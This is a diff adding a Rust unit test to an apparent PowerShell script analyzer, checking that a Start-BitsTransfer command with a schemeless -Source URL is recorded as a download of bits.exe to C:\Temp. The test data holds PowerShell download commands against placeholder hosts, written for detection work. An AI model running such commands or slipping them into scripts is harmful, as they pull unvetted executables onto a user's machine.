@@ -8567,6 +8567,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn start_bitstransfer_schemeless_source_extracted() {
+        let ps = r#"Start-BitsTransfer -Destination C:\Temp\bits.exe -Source bits-schemeless.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-schemeless.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS schemeless -Source was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_bitstransfer_proxylist_url_is_not_promoted_to_download() {
         let ps = r#"Start-BitsTransfer -ProxyList http://bits-proxy.example:8080 -Source https://bits-proxy-actual.example/bits.exe -Destination C:\Temp\bits.exe"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
